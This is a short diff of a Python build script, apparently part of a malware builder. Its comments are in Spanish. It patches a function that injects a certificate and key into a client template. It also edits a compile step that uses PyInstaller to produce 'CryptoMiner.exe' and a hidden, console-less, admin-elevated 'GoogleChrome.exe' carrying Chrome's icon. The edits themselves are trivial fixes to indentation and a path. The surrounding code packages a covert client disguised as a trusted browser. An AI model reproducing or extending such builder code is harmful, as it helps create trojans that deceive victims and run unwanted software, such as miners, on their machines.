@@ -82,10 +82,10 @@ def import_certs(file, cert, key):
     content = read_file(file)
 
     # Modificamos línea 12
-    content[11] = "\treturn {}\n".format(cert)
+    content[11] = "    return {}\n".format(cert)
 
     # Modificamos línea 16
-    content[15] = "\treturn {}\n".format(key)
+    content[15] = "    return {}\n".format(key)
 
     # Escribimos en el archivo linea 11
     write_file(file, content)
@@ -200,7 +200,7 @@ def compileall(file_template):
                     "pyinstaller --onefile --clean -n CryptoMiner.exe --uac-admin --icon=./client/icons/minericon.ico ./client/main.py  ",
                     shell=True)
 
-            elif file_template == "client/main_inv.py":
+            elif file_template == "./client/main_inv.py":
                 subprocess.Popen(
                     "pyinstaller --noconsole --onefile --clean -n GoogleChrome.exe --uac-admin --icon=./client/icons/GoogleChrome.ico ./client/main_inv.py",
                     shell=True)
